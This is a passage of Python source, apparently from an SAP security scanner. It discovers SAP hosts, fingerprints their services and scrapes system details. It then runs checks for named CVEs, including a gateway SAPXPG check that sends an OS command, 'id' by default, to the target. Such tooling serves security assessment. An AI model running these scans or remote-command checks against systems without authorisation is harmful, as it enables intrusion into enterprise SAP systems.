            task = prog.add_task("Pre-scanning %d host(s)" % len(targets), total=total_prescan_probes)
            def prescan_host(tip):
                def port_cb():
                    prog.update(task, advance=1)
                return (tip, scan_sap_ports(tip, instances, timeout, threads, verbose=False, quick=True, progress_callback=port_cb))

            with ThreadPoolExecutor(max_workers=min(len(targets), threads)) as executor:
                futures = {executor.submit(prescan_host, t): t for t in targets}
                for future in as_completed(futures):
                    tip, quick_ports = future.result()
                    if quick_ports:
                        sap_targets.append(tip)
                        prescan_results[tip] = quick_ports
                        prog.console.print("[+] %s: SAP detected (%s)" % (
                            tip,
                            ", ".join(str(p) for p in sorted(quick_ports.keys()))))
                    else:
                        log_verbose("  No SAP on %s, skipping" % tip)
    else:
        prescan_done = [0]
        def prescan_host(tip):
            def port_cb():
                prescan_done[0] += 1
                pct = prescan_done[0] * 100 // total_prescan_probes
                prev_pct = (prescan_done[0] - 1) * 100 // total_prescan_probes
                if pct != prev_pct and pct % 10 == 0:
                    sys.stdout.write("\r[*] Pre-scanning ... %d%%" % pct)
                    sys.stdout.flush()
            return (tip, scan_sap_ports(tip, instances, timeout, threads, verbose=False, quick=True, progress_callback=port_cb, cancel_check=cancel_check))

        with ThreadPoolExecutor(max_workers=min(len(targets), threads)) as executor:
            futures = {executor.submit(prescan_host, t): t for t in targets}
            for future in as_completed(futures):
                if cancel_check and cancel_check():
                    for f in futures:
                        f.cancel()
                    break
                tip, quick_ports = future.result()
                if quick_ports:
                    sap_targets.append(tip)
                    prescan_results[tip] = quick_ports
                    sys.stdout.write("\r" + " " * 40 + "\r")
                    print("[+] %s: SAP detected (%s)" % (
                        tip,
                        ", ".join(str(p) for p in sorted(quick_ports.keys()))))
                else:
                    log_verbose("  No SAP on %s, skipping" % tip)
        sys.stdout.write("\r" + " " * 40 + "\r")
        sys.stdout.flush()

    if cancel_check and cancel_check():
        return landscape

    if multi_target:
        if not sap_targets:
            print("\n[-] No SAP systems found on any target")
            return landscape

        # Sort so output is deterministic
        sap_targets.sort(key=lambda ip: tuple(int(o) for o in ip.split(".") if o.isdigit()))
        print("[*] %d/%d hosts have SAP services, full scanning ..." % (len(sap_targets), len(targets)))
    else:
        # Single target: always do the full scan even if prescan found nothing
        sap_targets = targets

    prescan_ports = prescan_results

    for target_ip in sap_targets:
        if cancel_check and cancel_check():
            break
        # Phase 2: full port scan
        print("\n[*] Scanning %s ..." % target_ip)

        port_list = build_port_list(instances)
        unique_ports = set(p[0] for p in port_list)
        total_ports = len(unique_ports)
        host_prescan_data = prescan_ports.get(target_ip)  # full dict {port: {service, instance, desc}}

        if has_progress:
            prog = Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TimeElapsedColumn(),
            )
            with prog:
                task = prog.add_task("Port scanning %s" % target_ip, total=total_ports)
                def port_cb():
                    prog.update(task, advance=1)
                open_ports = scan_sap_ports(target_ip, instances, timeout, threads, verbose, port_cb)
        else:
            scan_done = [0]
            def port_cb():
                scan_done[0] += 1
                pct = scan_done[0] * 100 // total_ports
                prev_pct = (scan_done[0] - 1) * 100 // total_ports
                if pct != prev_pct and pct % 10 == 0:
                    sys.stdout.write("\r[*] Port scanning %s ... %d%%" % (target_ip, pct))
                    sys.stdout.flush()
            open_ports = scan_sap_ports(target_ip, instances, timeout, threads, verbose, port_cb, cancel_check=cancel_check)
            sys.stdout.write("\r" + " " * 50 + "\r")
            sys.stdout.flush()

        if cancel_check and cancel_check():
            break

        # Merge prescan-confirmed ports that the full scan missed —
        # the full scan's connection flood can cause the target to drop
        # connections on ports that the lighter prescan detected fine.
        # Trust prescan results: if the lighter prescan confirmed a port
        # was open, re-verifying after the connection flood is unreliable
        # and defeats the purpose of this recovery step.
        if host_prescan_data:
            for port, info in host_prescan_data.items():
                if port not in open_ports:
                    open_ports[port] = info
                    if verbose:
                        log_verbose("  Port %d recovered from prescan (%s)" % (port, info["description"]))

        if not open_ports:
            log_verbose("  No SAP ports found on %s" % target_ip)
            continue

        print("[+] %s: %d open ports: %s" % (
            target_ip, len(open_ports),
            ", ".join(str(p) for p in sorted(open_ports.keys()))))

        # Group ports by instance
        instance_ports = {}
        xx_ports = {}  # ports we couldn't map to an instance
        for port, info in open_ports.items():
            inst = info["instance"]
            if inst == "XX":
                inst = deduce_instance(port)
            if inst == "XX":
                xx_ports[port] = info["description"]
            else:
                if inst not in instance_ports:
                    instance_ports[inst] = {}
                instance_ports[inst][port] = info["description"]

        # Merge XX ports into existing instances (or first instance)
        if xx_ports and instance_ports:
            first_inst = sorted(instance_ports.keys())[0]
            instance_ports[first_inst].update(xx_ports)
        elif xx_ports:
            instance_ports["XX"] = xx_ports

        # Try to resolve hostname
        hostname = ""
        try:
            hostname = socket.gethostbyaddr(target_ip)[0]
        except (socket.herror, socket.gaierror):
            hostname = target_ip

        # Create SAP system and instances
        sys_obj = SAPSystem(hostname=hostname)
        sid_found = False

        for inst_nr, ports in sorted(instance_ports.items()):
            if cancel_check and cancel_check():
                break
            instance = SAPInstance(
                host=hostname,
                ip=target_ip,
                instance_nr=inst_nr,
                ports=ports,
            )

            # Fingerprint and gather info from each service
            for port in sorted(ports.keys()):
                if cancel_check and cancel_check():
                    break
                svc_desc = ports[port]

                # SAPControl - only query one port per instance (prefer HTTPS)
                if "SAPControl" in svc_desc:
                    use_ssl = "HTTPS" in svc_desc
                    if "sapcontrol" in instance.services:
                        # Already registered; upgrade to HTTPS if this one is HTTPS
                        if use_ssl and not instance.services["sapcontrol"].get("ssl"):
                            instance.services["sapcontrol"] = {"port": port, "ssl": use_ssl}
                        continue
                    log_verbose("  Querying SAPControl on port %d ..." % port)

                    props = query_sapcontrol_instance_properties(target_ip, port, use_ssl, timeout)
                    if props.get("success") and props.get("properties"):
                        p = props["properties"]
                        for key, val in p.items():
                            if isinstance(val, str) and val:
                                instance.info["sc_%s" % key] = val
                        # Extract SID from SAPSYSTEMNAME property
                        sysname = p.get("SAPSYSTEMNAME", "")
                        if sysname and not sid_found:
                            sys_obj.sid = sysname.strip()
                            sid_found = True
                        syslist = query_sapcontrol_system_instances(target_ip, port, use_ssl, timeout)
                        if syslist.get("success") and syslist.get("properties"):
                            sp = syslist["properties"]
                            if "hostname" in sp:
                                hname = sp["hostname"]
                                if isinstance(hname, list):
                                    hname = hname[0]
                                sys_obj.hostname = hname
                                instance.info["hostname"] = hname
                            if "instanceNr" in sp:
                                instance.info["instanceNr"] = str(sp["instanceNr"])
                            for prop_name, prop_val in sp.items():
                                if isinstance(prop_val, str) and "_" in prop_val:
                                    parts = prop_val.split("_")
                                    if len(parts) >= 3 and len(parts[-2]) == 3 and parts[-2].isupper():
                                        if not sid_found:
                                            sys_obj.sid = parts[-2]
                                            sid_found = True

                    instance.services["sapcontrol"] = {"port": port, "ssl": use_ssl}

                # ICM HTTP
                elif "ICM HTTP" in svc_desc or "HTTP" in svc_desc:
                    use_ssl = "HTTPS" in svc_desc or port in (443, 8443) or (inst_nr.isdigit() and port == 4300 + int(inst_nr))
                    log_verbose("  Querying ICM on port %d (ssl=%s) ..." % (port, use_ssl))

                    pub_info = query_sap_public_info(target_ip, port, use_ssl, timeout)
                    if pub_info.get("accessible"):
                        # RFCSI XML uses tags like RFCSYSID, RFCDEST, RFCDBHOST, etc.
                        key_map = {
                            "RFCSYSID": "SID",
                            "RFCDEST": "RFCDEST",
                            "RFCDBHOST": "DBHOST",
                            "RFCDBSYS": "DBSYS",
                            "RFCHOST": "HOST",
                            "RFCSAPRL": "SAPRL",
                            "RFCMACH": "MACH",
                            "RFCOPSYS": "OPSYS",
                            "RFCKERNRL": "KERNRL",
                        }
                        for rfc_key, nice_key in key_map.items():
                            if rfc_key in pub_info:
                                instance.info[nice_key] = pub_info[rfc_key]
                        # Also store legacy keys
                        for key in ["SAPSYSTEM", "SAPSYSTEMNAME", "SAPDBHOST",
                                     "PHYS_MEMSIZE", "KERNEL_VERSION"]:
                            if key in pub_info:
                                instance.info[key] = pub_info[key]
                        # Extract SID
                        sid_val = pub_info.get("RFCSYSID", pub_info.get("SAPSYSTEMNAME", ""))
                        if sid_val and not sid_found:
                            sys_obj.sid = sid_val.strip()
                            sid_found = True
                        # Extract hostname from RFCDEST (format: hostname_SID_NN)
                        rfcdest = pub_info.get("RFCDEST", "")
                        if "_" in rfcdest:
                            parts = rfcdest.split("_")
                            if len(parts) >= 2 and not sys_obj.hostname:
                                sys_obj.hostname = parts[0]
                        # Extract kernel
                        kernrl = pub_info.get("RFCKERNRL", "")
                        if kernrl and not sys_obj.kernel:
                            sys_obj.kernel = kernrl.strip()
                        # Track the working scheme for ICM
                        if pub_info.get("scheme") == "https" and not use_ssl:
                            use_ssl = True  # Remember this port needs HTTPS

                    # Try fingerprint with detected scheme first
                    actual_ssl = use_ssl
                    if pub_info.get("scheme") == "https":
                        actual_ssl = True
                    icm_info = fingerprint_icm(target_ip, port, timeout, actual_ssl)
                    if not icm_info.get("accessible") and not actual_ssl:
                        # Try HTTPS fallback
                        icm_info = fingerprint_icm(target_ip, port, timeout, True)
                        if icm_info.get("accessible"):
                            actual_ssl = True
                    # Detect SSL-required ports (server returned "Illegal SSL request")
                    ssl_required = icm_info.get("ssl_required", False)
                    if ssl_required and not actual_ssl:
                        actual_ssl = True  # Port requires SSL even if handshake failed

                    # Only register as ICM if there's SAP evidence:
                    # /sap/public/info returned SAP data, or server header contains SAP/ICM
                    is_sap = pub_info.get("accessible") or icm_info.get("is_sap")
                    if is_sap:
                        instance.services["icm"] = {
                            "port": port, "ssl": actual_ssl,
                            "server": icm_info.get("server", ""),
                            "ssl_required": ssl_required,
                        }
                        # Update port description if HTTPS was detected but not in original desc
                        if actual_ssl and "HTTPS" not in instance.ports.get(port, ""):
                            old_desc = instance.ports.get(port, "ICM HTTP")
                            instance.ports[port] = old_desc.replace("HTTP", "HTTPS")
                    else:
                        # Not ICM — try BusinessObjects HTTP detection
                        bo_info = fingerprint_bo_web(target_ip, port, use_ssl, timeout)
                        if bo_info.get("accessible"):
                            instance.services["bo_web"] = {
                                "port": port,
                                "ssl": bo_info.get("scheme") == "https",
                                "server": bo_info.get("server", ""),
                                "path": bo_info.get("path", ""),
                            }
                            instance.ports[port] = "SAP BusinessObjects HTTP"
                            log_verbose("  BusinessObjects web detected on port %d (%s)"
                                        % (port, bo_info.get("path", "")))

                # Gateway
                elif "Gateway" in svc_desc:
                    log_verbose("  Checking gateway on port %d ..." % port)
                    gw_info = fingerprint_gateway(target_ip, port, timeout)
                    if gw_info.get("accessible"):
                        instance.services["gateway"] = {"port": port}

                # Message Server Internal
                elif "Message Server Internal" in svc_desc:
                    log_verbose("  Checking MS internal on port %d ..." % port)
                    ms_info = fingerprint_ms_internal(target_ip, port, timeout)
                    if ms_info.get("accessible"):
                        ms_ssl = ms_info.get("ssl", False)
                        instance.services["ms_internal"] = {"port": port, "ssl": ms_ssl}

                        if ms_ssl:
                            log_verbose("  MS internal port %d requires SSL (mTLS) — encrypted" % port)
                        else:
                            # Plain TCP — query dump info and server list
                            dump = query_ms_dump_info(target_ip, port, timeout)
                            if dump.get("kernel_release"):
                                instance.info["kernel_release"] = dump["kernel_release"]
                                sys_obj.kernel = dump["kernel_release"]
                            if dump.get("patch_number"):
                                instance.info["patch_number"] = dump["patch_number"]

                            # Try to get server list
                            servers = query_ms_server_list(target_ip, port, timeout)
                            if servers:
                                for srv in servers:
                                    name = srv.get("client_name", "")
                                    parts = name.split("_")
                                    if len(parts) >= 3:
                                        srv_sid = parts[-2]
                                        if not sid_found:
                                            sys_obj.sid = srv_sid
                                            sid_found = True
                                        if srv.get("hostaddrv4") and srv["hostaddrv4"] != target_ip:
                                            sys_obj.relationships.append({
                                                "sid": srv_sid,
                                                "host": srv.get("hostname", ""),
                                                "ip": srv.get("hostaddrv4", ""),
                                            })
                                instance.info["ms_servers"] = str(len(servers)) + " servers"

                # Dispatcher
                elif "Dispatcher" in svc_desc:
                    log_verbose("  Checking dispatcher on port %d ..." % port)
                    disp_info = fingerprint_dispatcher(target_ip, port, timeout)
                    if disp_info.get("accessible"):
                        instance.services["dispatcher"] = {"port": port}

                        # Scrape login screen info via DIAG protocol
                        log_verbose("  Scraping DIAG login screen on %s:%d ..." % (target_ip, port))
                        diag_info = query_diag_login_screen(target_ip, port, max(timeout + 5, 10))
                        if diag_info:
                            err = diag_info.pop("_error", None)
                            for dk, dv in diag_info.items():
                                if dv and dk not in instance.info:
                                    instance.info["diag_%s" % dk] = dv
                            # Extract SID from DIAG if not already found
                            diag_dbname = diag_info.get("DBNAME", "")
                            if diag_dbname and not sid_found:
                                # DBNAME is often the SID itself
                                if len(diag_dbname) == 3 and diag_dbname.isupper():
                                    sys_obj.sid = diag_dbname
                                    sid_found = True
                            # Extract kernel from DIAG
                            diag_kernel = diag_info.get("KERNEL_VERSION", "")
                            if diag_kernel and not sys_obj.kernel:
                                sys_obj.kernel = diag_kernel
                            # Extract hostname from DIAG
                            diag_cpu = diag_info.get("CPUNAME", "")
                            if diag_cpu and not sys_obj.hostname:
                                sys_obj.hostname = diag_cpu

                # MDM Server
                elif "MDM" in svc_desc:
                    log_verbose("  Checking MDM server on port %d ..." % port)
                    mdm_info = fingerprint_mdm(target_ip, port, timeout)
                    if mdm_info.get("accessible"):
                        instance.services["mdm"] = {"port": port}
                        if mdm_info.get("version"):
                            instance.info["mdm_version"] = mdm_info["version"]
                        # SAPControl fallback for version/SID when MDM
                        # protocol negotiation failed (older MDM versions)
                        if "mdm_version" not in instance.info:
                            sc_svc = instance.services.get("sapcontrol")
                            if sc_svc:
                                log_verbose("  MDM protocol version query failed, "
                                            "falling back to SAPControl ...")
                                sc_ver = query_sapcontrol_version(
                                    target_ip, sc_svc["port"],
                                    sc_svc.get("ssl", False), timeout)
                                if sc_ver.get("success"):
                                    props = sc_ver.get("properties", {})
                                    # VersionInfo: "710, patch 146, changelist ..."
                                    # SAP release code 710 = version 7.1 (digit + 2-digit minor)
                                    vi = props.get("VersionInfo", "")
                                    if isinstance(vi, list):
                                        vi = vi[0]
                                    vm = re.match(r'(\d)(\d)(\d),\s*patch\s+(\d+)', vi)
                                    if vm:
                                        major = vm.group(1)
                                        minor = vm.group(2)
                                        patch = vm.group(4)
                                        ver_str = "Version %s.%s (%s.%s.0.%s)" % (
                                            major, minor, major, minor, patch)
                                        instance.info["mdm_version"] = ver_str
                                    # SID from Filename: "C:\usr\sap\MDM\MDS00\..."
                                    fn = props.get("Filename", "")
                                    if isinstance(fn, list):
                                        fn = fn[0]
                                    sm = re.search(r'[/\\]usr[/\\]sap[/\\]([A-Z][A-Z0-9]{2})[/\\]', fn)
                                    if sm and "sid" not in mdm_info:
                                        mdm_info["sid"] = sm.group(1)
                        # Break down version: "Version 7.1 (7.1.16.220 Win64)"
                        mdm_ver = instance.info.get("mdm_version", "")
                        if mdm_ver:
                            vm = re.search(r'(\d+)\.(\d+)\.(\d+)\.(\d+)', mdm_ver)
                            if vm:
                                instance.info["mdm_release"] = "%s.%s" % (vm.group(1), vm.group(2))
                                instance.info["mdm_sp"] = "SP%03d" % int(vm.group(3))
                                instance.info["mdm_patchlevel"] = vm.group(4)
                        if mdm_info.get("sid"):
                            mdm_sid = mdm_info["sid"]
                            instance.info["SID"] = mdm_sid
                            if not sid_found:
                                sys_obj.sid = mdm_sid
                                sid_found = True

                # SAP MDM Import Server (MDIS)
                elif "MDM Import" in svc_desc:
                    log_verbose("  Checking MDM Import Server on port %d ..." % port)
                    mdis_info = fingerprint_mdis(target_ip, port, timeout)
                    if mdis_info.get("accessible"):
                        instance.services["mdis"] = {"port": port}
                        if mdis_info.get("version"):
                            instance.info["mdis_version"] = mdis_info["version"]
                            if mdis_info.get("platform"):
                                instance.info["mdis_platform"] = mdis_info["platform"]
                            # Use MDIS version as MDM version fallback if MDS
                            # didn't provide one
                            if "mdm_version" not in instance.info:
                                instance.info["mdm_version"] = mdis_info["version"]

                # SAP BusinessObjects CMS
                elif "BusinessObjects" in svc_desc:
                    log_verbose("  Checking BusinessObjects CMS on port %d ..." % port)
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(timeout)
                        sock.connect((target_ip, port))
                        sock.close()
                        instance.services["bo_cms"] = {"port": port}
                        log_verbose("  BusinessObjects CMS confirmed on port %d" % port)
                    except (socket.error, OSError):
                        pass

                # SAP Content Server
                elif "Content Server" in svc_desc:
                    use_ssl = "HTTPS" in svc_desc
                    log_verbose("  Checking Content Server on port %d ..." % port)
                    cs_info = fingerprint_content_server(target_ip, port, use_ssl, timeout)
                    if cs_info.get("accessible"):
                        instance.services["content_server"] = {
                            "port": port, "ssl": use_ssl,
                            "server": cs_info.get("server", ""),
                        }
                    else:
                        # Port is in Content Server range, register even without HTTP confirm
                        instance.services["content_server"] = {"port": port, "ssl": use_ssl}

                # SAP Router
                elif "Router" in svc_desc:
                    log_verbose("  Checking SAP Router on port %d ..." % port)
                    rt_info = fingerprint_saprouter(target_ip, port, timeout)
                    if rt_info.get("confirmed"):
                        instance.services["saprouter"] = {"port": port}
                        if rt_info.get("version"):
                            instance.info["saprouter_version"] = rt_info["version"]
                        if rt_info.get("hostname") and not sys_obj.hostname:
                            sys_obj.hostname = rt_info["hostname"]
                    elif rt_info.get("accessible"):
                        # TCP connected but SAProuter string not in response;
                        # register anyway since port 3299 is a known SAP Router port
                        instance.services["saprouter"] = {"port": port}
                        log_verbose("  SAP Router on port %d: TCP open, protocol unconfirmed" % port)

            sys_obj.instances.append(instance)

        # Post-fingerprint validation: remove instances with zero confirmed services.
        # When scanning wide instance ranges (00-99), port formulas can collide with
        # non-SAP services (e.g. 8009=AJP, 8080=generic HTTP). If fingerprinting
        # couldn't confirm any SAP service on any port, the instance is bogus.
        confirmed = []
        orphan_ports = {}
        for inst in sys_obj.instances:
            if inst.services:
                confirmed.append(inst)
            else:
                if verbose:
                    log_verbose("  Removing unconfirmed instance %s (ports: %s)" % (
                        inst.instance_nr,
                        ", ".join(str(p) for p in sorted(inst.ports.keys()))))
                orphan_ports.update(inst.ports)
        if confirmed:
            sys_obj.instances = confirmed
            # Merge orphaned ports into the first confirmed instance
            if orphan_ports:
                sys_obj.instances[0].ports.update(orphan_ports)
        # else: keep all instances (nothing confirmed, don't discard everything)

        # Set kernel from instance info if not already set
        if not sys_obj.kernel:
            for inst in sys_obj.instances:
                if "kernel_release" in inst.info:
                    sys_obj.kernel = inst.info["kernel_release"]
                    break
                if "KERNEL_VERSION" in inst.info:
                    sys_obj.kernel = inst.info["KERNEL_VERSION"]
                    break

        # Detect system type — some types are exclusive
        is_mdm = False
        is_bo = False
        is_cs = False
        is_router = False
        is_cloud_connector = False
        for inst in sys_obj.instances:
            if (inst.services.get("mdm") or inst.services.get("mdis")) and inst.info.get("mdm_version"):
                is_mdm = True
            if inst.services.get("bo_cms") or inst.services.get("bo_web"):
                is_bo = True
            if inst.services.get("content_server"):
                is_cs = True
            if inst.services.get("saprouter"):
                is_router = True
            icm_svc = inst.services.get("icm")
            if icm_svc and "cloud connector" in icm_svc.get("server", "").lower():
                is_cloud_connector = True
        if is_cloud_connector:
            sys_obj.system_type = "CLOUD_CONNECTOR"
        elif is_mdm:
            sys_obj.system_type = "MDM"
        elif is_bo:
            sys_obj.system_type = "BUSINESSOBJECTS"
            if sys_obj.sid == "UNKNOWN":
                sys_obj.sid = "BO"
        elif is_cs:
            sys_obj.system_type = "CONTENT_SERVER"
        elif is_router:
            sys_obj.system_type = "SAPROUTER"
            if sys_obj.sid == "UNKNOWN":
                sys_obj.sid = "SAPROUTER"
        else:
            type_parts = []
            # ABAP: presence of a DIAG dispatcher port (32XX)
            for inst in sys_obj.instances:
                if inst.services.get("dispatcher"):
                    type_parts.append("ABAP")
                    break
            # JAVA: SAPControl properties contain J2EE component list
            for inst in sys_obj.instances:
                if inst.info.get("sc_J2EE Components") == "J2EEGetComponentList":
                    type_parts.append("JAVA")
                    break
            if type_parts:
                sys_obj.system_type = "+".join(type_parts)
        if sys_obj.system_type:
            log_verbose("  System type detected: %s" % sys_obj.system_type)

        # Skip non-SAP systems: if no kernel version was identified and SID is
        # still UNKNOWN, the host has no confirmed SAP services (e.g. generic
        # HTTP servers on ports 443/8080).
        if not sys_obj.kernel and sys_obj.sid == "UNKNOWN":
            has_any_service = any(inst.services for inst in sys_obj.instances)
            if not has_any_service:
                log_verbose("  Skipping %s (%s): no SAP services confirmed" % (
                    target_ip, sys_obj.hostname))
                continue

        landscape.append(sys_obj)

    return landscape


ICM_PATH_COUNT = 1633  # number of paths in embedded wordlist


def _get_instance_http_ports(inst):
    """Get list of (port, use_ssl) tuples for HTTP vulnerability scanning."""
    gw_svc = inst.services.get("gateway")
    ms_svc = inst.services.get("ms_internal")
    sc_svc = inst.services.get("sapcontrol")

    skip_ports = set()
    if gw_svc:
        skip_ports.add(gw_svc.get("port", 0))
    if ms_svc:
        skip_ports.add(ms_svc.get("port", 0))
    if sc_svc:
        skip_ports.add(sc_svc.get("port", 0))

    http_ports = []
    icm_svc = inst.services.get("icm")
    if icm_svc:
        http_ports.append((icm_svc["port"], icm_svc.get("ssl", False)))

    for p, desc in sorted(inst.ports.items()):
        if p in skip_ports:
            continue
        if icm_svc and p == icm_svc["port"]:
            continue
        if "HTTP" in desc and "SAPControl" not in desc and "HostControl" not in desc:
            http_ports.append((p, "HTTPS" in desc))

    return http_ports


def _get_instance_p4_ports(inst):
    """Get list of P4 ports (5NN04) from instance open ports."""
    p4_ports = []
    for p in sorted(inst.ports.keys()):
        if 50004 <= p <= 59904 and (p - 50000) % 100 == 4:
            p4_ports.append(p)
    return p4_ports


def assess_vulnerabilities(landscape, gw_cmd="id", timeout=5, verbose=False,
                           url_scan=False, url_scan_threads=25, cancel_check=None):
    """Phase 2: Run vulnerability checks against discovered systems.

    cancel_check: callable returning True when scan should be aborted.
    """

    def cancelled():
        return cancel_check and cancel_check()

    # Pre-count total check steps for progress tracking
    total_checks = 0
    for sys_obj in landscape:
        is_java = "JAVA" in sys_obj.system_type
        for inst in sys_obj.instances:
            if inst.services.get("gateway"):
                total_checks += 2  # SAPXPG + monitor
            if inst.services.get("ms_internal"):
                total_checks += 2  # internal + ACL
            http_ports = _get_instance_http_ports(inst)
            if is_java:
                total_checks += len(http_ports)      # CVE-2020-6287 (RECON)
                total_checks += len(http_ports)      # CVE-2025-31324
                total_checks += len(http_ports)      # CVE-2020-6207 (SolMan EEM)
                total_checks += len(http_ports)      # CVE-2010-5326 (Invoker Servlet)
                total_checks += len(http_ports)      # CVE-2021-33690 (NWDI CBS)
            total_checks += len(http_ports)      # CVE-2022-22536 (ICMAD)
            total_checks += len(http_ports)      # CVE-2020-6308 (BO SSRF)
            total_checks += len(http_ports)      # info leak
            if inst.services.get("sapcontrol"):
                total_checks += 1
            if inst.services.get("dispatcher"):
                total_checks += 1
            if inst.services.get("mdm") or inst.services.get("mdis"):
                total_checks += 2  # CVE-2021-21475 + CVE-2021-21482
            if inst.services.get("bo_web") or inst.services.get("bo_cms"):
                total_checks += len(http_ports)      # BO CMC exposed
                total_checks += len(http_ports)      # CVE-2024-41730 (BO SSO token)
                total_checks += len(http_ports)      # CVE-2025-0061 (BO session hijack)
            if inst.services.get("bo_cms"):
                total_checks += 1                    # BO CMS port exposed
            # CVE-2022-41272 P4 service
            total_checks += len(_get_instance_p4_ports(inst))
            # Cloud Connector port exposure
            _icm_svc = inst.services.get("icm")
            if _icm_svc and "cloud connector" in _icm_svc.get("server", "").lower():
                total_checks += 1
            # HANA SQL ports
            for p, desc in inst.ports.items():
                if "HANA SQL" in desc:
                    total_checks += 1
            # SSL/TLS ports — count every unique port that will be checked
            _ssl_count_ports = set()
            for p, desc in inst.ports.items():
                if "HTTPS" in desc:
                    _ssl_count_ports.add(p)
            for svc in inst.services.values():
                if isinstance(svc, dict) and svc.get("ssl") and svc.get("port"):
                    _ssl_count_ports.add(svc["port"])
            total_checks += len(_ssl_count_ports)
            if url_scan:
                total_checks += len(http_ports) * ICM_PATH_COUNT

    has_progress = HAS_RICH

    if has_progress:
        prog = Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            MofNCompleteColumn(),
            TimeElapsedColumn(),
        )
    else:
        prog = None

    _vuln_done = [0]

    def step(n=1):
        if prog and _vuln_task is not None:
            prog.update(_vuln_task, advance=n)
        elif total_checks > 0:
            _vuln_done[0] += n
            pct = _vuln_done[0] * 100 // total_checks
            prev_pct = (_vuln_done[0] - n) * 100 // total_checks
            if pct != prev_pct and pct % 5 == 0:
                sys.stdout.write("\r[*] Vulnerability assessment ... %d%%" % pct)
                sys.stdout.flush()

    _vuln_task = None

    ctx = prog if has_progress else contextlib.nullcontext()
    with ctx:
        if has_progress:
            _vuln_task = prog.add_task("Vulnerability assessment", total=total_checks)

        for sys_obj in landscape:
            if cancelled():
                print("\n[!] Scan cancelled by user")
                break

            for inst in sys_obj.instances:
                if cancelled():
                    break

                inst_label = "%s %s:%s" % (sys_obj.sid, inst.ip, inst.instance_nr)

                # Gateway checks
                gw_svc = inst.services.get("gateway")
                if gw_svc:
                    port = gw_svc["port"]

                    print("[*] %s - Checking gateway SAPXPG on port %d ..." % (inst_label, port))
                    hostname = sys_obj.hostname or inst.host
                    sid = sys_obj.sid if sys_obj.sid != "UNKNOWN" else "SAP"
                    f = check_gw_sapxpg(inst.ip, port, sid, hostname, gw_cmd, timeout,
                                        instance=inst.instance_nr)
                    if f:
                        inst.findings.append(f)
                    step()

                    if cancelled():
                        break

                    # Monitor open check
                    log_verbose("  Checking GW monitor on %s:%d ..." % (inst.ip, port))
                    f = check_gw_monitor_open(inst.ip, port, timeout)
                    if f:
                        inst.findings.append(f)
                    step()

                # Message Server checks
                ms_svc = inst.services.get("ms_internal")
                if ms_svc and not cancelled():
                    port = ms_svc["port"]
                    ms_ssl = ms_svc.get("ssl", False)

                    if ms_ssl:
                        print("[+] %s - MS internal port %d uses SSL/mTLS — protected" % (inst_label, port))
                        inst.findings.append(Finding(
                            name="Message Server Internal Port SSL/mTLS Enabled",
                            severity=Severity.INFO,
                            description=(
                                "The SAP Message Server internal port %d has SSL with "
                                "mutual TLS (client certificate authentication) enabled "
                                "via system/secure_communications. Anonymous connections "
                                "are rejected, protecting against rogue Application "
                                "Server registration and gateway pivoting attacks." % port
                            ),
                            remediation="No action required — this is a secure configuration.",
                            detail="TLS handshake requires SAP-signed client certificate (mTLS)",
                            port=port,
                        ))
                        step()  # skip internal open check
                        step()  # skip ACL check
                    else:
                        print("[*] %s - Checking message server on port %d ..." % (inst_label, port))
                        f = check_ms_internal_open(inst.ip, port, timeout)
                        if f:
                            inst.findings.append(f)
                        step()

                        f = check_ms_acl(inst.ip, port, timeout)
                        if f:
                            inst.findings.append(f)
                        step()

                if cancelled():
                    break

                # Collect all HTTP ports to check
                http_ports = _get_instance_http_ports(inst)

                if http_ports:
                    print("[*] %s - Checking HTTP vulnerabilities on %d port(s) ..." % (
                        inst_label, len(http_ports)))

                # Java-only CVE checks
                is_java = "JAVA" in sys_obj.system_type

                # Check each HTTP port for CVE-2020-6287 (RECON) — Java only
                if is_java:
                    for port, use_ssl in http_ports:
                        if cancelled():
                            break
                        log_verbose("  Checking CVE-2020-6287 (RECON) on %s:%d ..." % (inst.ip, port))
                        f = check_cve_2020_6287(inst.ip, port, use_ssl, timeout)
                        if f:
                            inst.findings.append(f)
                        step()

                # Check each HTTP port for CVE-2025-31324 — Java only
                if is_java:
                    for port, use_ssl in http_ports:
                        if cancelled():
                            break
                        log_verbose("  Checking CVE-2025-31324 on %s:%d ..." % (inst.ip, port))
                        f = check_cve_2025_31324(inst.ip, port, use_ssl, timeout)
                        if f:
                            inst.findings.append(f)
                        step()

                if cancelled():
                    break

                # Check CVE-2022-22536 (ICMAD - HTTP Request Smuggling)
                # Once found on one port, skip actual check on remaining (but still step)
                icmad_found = False
                for port, use_ssl in http_ports:
                    if cancelled():
                        break
                    if not icmad_found:
                        log_verbose("  Checking CVE-2022-22536 (ICMAD) on %s:%d ..." % (inst.ip, port))
                        f = check_cve_2022_22536(inst.ip, port, use_ssl, timeout)
                        if f:
                            inst.findings.append(f)
                            icmad_found = True
                    step()

                if cancelled():
                    break

                # Check CVE-2020-6207 (Solution Manager EEM) — Java only
                if is_java:
                    for port, use_ssl in http_ports:
                        if cancelled():
                            break
                        log_verbose("  Checking CVE-2020-6207 (SolMan EEM) on %s:%d ..." % (inst.ip, port))
                        f = check_cve_2020_6207(inst.ip, port, use_ssl, timeout)
                        if f:
                            inst.findings.append(f)
                        step()

                    if cancelled():
                        break

                # Check CVE-2010-5326 (Invoker Servlet) — Java only
                if is_java:
                    for port, use_ssl in http_ports:
                        if cancelled():
                            break
                        log_verbose("  Checking CVE-2010-5326 (Invoker Servlet) on %s:%d ..." % (inst.ip, port))
                        f = check_cve_2010_5326(inst.ip, port, use_ssl, timeout)
                        if f:
                            inst.findings.append(f)
                        step()

                    if cancelled():
                        break

                # Check CVE-2021-33690 (NWDI CBS SSRF) — Java only
                if is_java:
                    for port, use_ssl in http_ports:
                        if cancelled():
                            break
                        log_verbose("  Checking CVE-2021-33690 (NWDI CBS) on %s:%d ..." % (inst.ip, port))
                        f = check_cve_2021_33690(inst.ip, port, use_ssl, timeout)
                        if f:
                            inst.findings.append(f)
                        step()

                if cancelled():
                    break

                # Check CVE-2020-6308 (BusinessObjects SSRF)
                for port, use_ssl in http_ports:
                    if cancelled():
                        break
                    log_verbose("  Checking CVE-2020-6308 (BO SSRF) on %s:%d ..." % (inst.ip, port))
